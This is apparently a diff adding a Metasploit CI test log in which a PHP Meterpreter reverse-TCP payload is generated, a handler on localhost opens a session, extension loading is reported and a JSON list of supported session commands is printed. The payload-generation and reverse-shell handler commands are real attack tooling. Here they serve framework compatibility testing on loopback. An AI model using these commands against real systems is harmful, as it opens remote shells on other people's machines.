@@ -1,0 +1,55 @@
+use php/meterpreter_reverse_tcp
+msf6 post(test/get_env) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3052-pr95wrtxt
+msf6 payload(php/meterpreter_reverse_tcp) > msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3052-pr95wrtxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3052-zdde3q.php -f raw AutoVerifySessionTimeout=30 lport=6003 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20231026-3052-gcp44ctxt MeterpreterDebugBuild=true
+[*] Writing 34914 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3052-zdde3q.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 2
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6003 
+[*] Meterpreter session 3 opened (127.0.0.1:6003 -> 127.0.0.1:50036) at 2023-10-26 19:04:07 +0000
+resource scripts/resource/meterpreter_compatibility.rc
+[*] Processing D:/a/metasploit-framework/metasploit-framework/scripts/resource/meterpreter_compatibility.rc for ERB directives.
+[*] resource (D:/a/metasploit-framework/metasploit-framework/scripts/resource/meterpreter_compatibility.rc)> Ruby Code (1113 bytes)
+[2023-10-26 19:04:07 +0000][android] Starting to loading extension
+[2023-10-26 19:04:07 +0000][android] Failed loading
+[2023-10-26 19:04:07 +0000][appapi] Starting to loading extension
+[2023-10-26 19:04:07 +0000][appapi] Failed loading
+[2023-10-26 19:04:07 +0000][bofloader] Starting to loading extension
+[2023-10-26 19:04:07 +0000][bofloader] Failed loading
+[2023-10-26 19:04:07 +0000][espia] Starting to loading extension
+[2023-10-26 19:04:07 +0000][espia] Failed loading
+[2023-10-26 19:04:07 +0000][extapi] Starting to loading extension
+[2023-10-26 19:04:07 +0000][extapi] Failed loading
+[2023-10-26 19:04:07 +0000][incognito] Starting to loading extension
+[2023-10-26 19:04:08 +0000][incognito] Failed loading
+[2023-10-26 19:04:08 +0000][kiwi] Starting to loading extension
+[2023-10-26 19:04:08 +0000][kiwi] Failed loading
+[2023-10-26 19:04:08 +0000][lanattacks] Starting to loading extension
+[2023-10-26 19:04:08 +0000][lanattacks] Failed loading
+[2023-10-26 19:04:08 +0000][peinjector] Starting to loading extension
+[2023-10-26 19:04:08 +0000][peinjector] Failed loading
+[2023-10-26 19:04:08 +0000][powershell] Starting to loading extension
+[2023-10-26 19:04:08 +0000][powershell] Failed loading
+[2023-10-26 19:04:08 +0000][priv] Starting to loading extension
+[2023-10-26 19:04:08 +0000][priv] Failed loading
+[2023-10-26 19:04:08 +0000][python] Starting to loading extension
+[2023-10-26 19:04:08 +0000][python] Failed loading
+[2023-10-26 19:04:08 +0000][sniffer] Starting to loading extension
+[2023-10-26 19:04:08 +0000][sniffer] Failed loading
+[2023-10-26 19:04:08 +0000][stdapi] Starting to loading extension
+[2023-10-26 19:04:08 +0000][stdapi] Loaded extension
+[2023-10-26 19:04:08 +0000][unhook] Starting to loading extension
+[2023-10-26 19:04:08 +0000][unhook] Failed loading
+[2023-10-26 19:04:08 +0000][winpmem] Starting to loading extension
+[2023-10-26 19:04:08 +0000][winpmem] Failed loading
+[2023-10-26 19:04:08 +0000] Generating result:
+{"sessions":[{"session_type":"php/windows","commands":[{"id":4,"name":"core_channel_open"},{"id":2,"name":"core_channel_eof"},{"id":5,"name":"core_channel_read"},{"id":8,"name":"core_channel_write"},{"id":1,"name":"core_channel_close"},{"id":3,"name":"core_channel_interact"},{"id":23,"name":"core_shutdown"},{"id":12,"name":"core_loadlib"},{"id":10,"name":"core_enumextcmd"},{"id":22,"name":"core_set_uuid"},{"id":16,"name":"core_negotiate_tlv_encryption"},{"id":11,"name":"core_get_session_guid"},{"id":21,"name":"core_set_session_guid"},{"id":13,"name":"core_machine_id"},{"id":1006,"name":"stdapi_fs_file_expand_path"},{"id":1003,"name":"stdapi_fs_delete_dir"},{"id":1011,"name":"stdapi_fs_mkdir"},{"id":1001,"name":"stdapi_fs_chdir"},{"id":1007,"name":"stdapi_fs_file_move"},{"id":1005,"name":"stdapi_fs_file_copy"},{"id":1008,"name":"stdapi_fs_getwd"},{"id":1009,"name":"stdapi_fs_ls"},{"id":1014,"name":"stdapi_fs_separator"},{"id":1016,"name":"stdapi_fs_stat"},{"id":1004,"name":"stdapi_fs_delete_file"},{"id":1013,"name":"stdapi_fs_search"},{"id":1010,"name":"stdapi_fs_md5"},{"id":1015,"name":"stdapi_fs_sha1"},{"id":1055,"name":"stdapi_sys_config_getuid"},{"id":1052,"name":"stdapi_sys_config_getenv"},{"id":1059,"name":"stdapi_sys_config_sysinfo"},{"id":1056,"name":"stdapi_sys_config_localtime"},{"id":1069,"name":"stdapi_sys_process_execute"},{"id":1068,"name":"stdapi_sys_process_close"},{"id":1071,"name":"stdapi_sys_process_get_processes"},{"id":1072,"name":"stdapi_sys_process_getpid"},{"id":1077,"name":"stdapi_sys_process_kill"},{"id":1026,"name":"stdapi_net_socket_tcp_shutdown"},{"id":1024,"name":"stdapi_net_resolve_host"},{"id":1025,"name":"stdapi_net_resolve_hosts"},{"id":1006,"name":"stdapi_fs_file_expand_path"},{"id":1003,"name":"stdapi_fs_delete_dir"},{"id":1011,"name":"stdapi_fs_mkdir"},{"id":1001,"name":"stdapi_fs_chdir"},{"id":1007,"name":"stdapi_fs_file_move"},{"id":1005,"name":"stdapi_fs_file_copy"},{"id":1008,"name":"stdapi_fs_getwd"},{"id":1009,"name":"stdapi_fs_ls"},{"id":1014,"name":"stdapi_fs_separator"},{"id":1016,"name":"stdapi_fs_stat"},{"id":1004,"name":"stdapi_fs_delete_file"},{"id":1013,"name":"stdapi_fs_search"},{"id":1010,"name":"stdapi_fs_md5"},{"id":1015,"name":"stdapi_fs_sha1"},{"id":1055,"name":"stdapi_sys_config_getuid"},{"id":1052,"name":"stdapi_sys_config_getenv"},{"id":1059,"name":"stdapi_sys_config_sysinfo"},{"id":1056,"name":"stdapi_sys_config_localtime"},{"id":1069,"name":"stdapi_sys_process_execute"},{"id":1068,"name":"stdapi_sys_process_close"},{"id":1071,"name":"stdapi_sys_process_get_processes"},{"id":1072,"name":"stdapi_sys_process_getpid"},{"id":1077,"name":"stdapi_sys_process_kill"},{"id":1026,"name":"stdapi_net_socket_tcp_shutdown"},{"id":1024,"name":"stdapi_net_resolve_host"},{"id":1025,"name":"stdapi_net_resolve_hosts"}]}]}
+msf6 payload(php/meterpreter_reverse_tcp) > sessions -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 3 closed.
+msf6 payload(php/meterpreter_reverse_tcp) > jobs -K
+Stopping all jobs...
+msf6 payload(php/meterpreter_reverse_tcp) > 
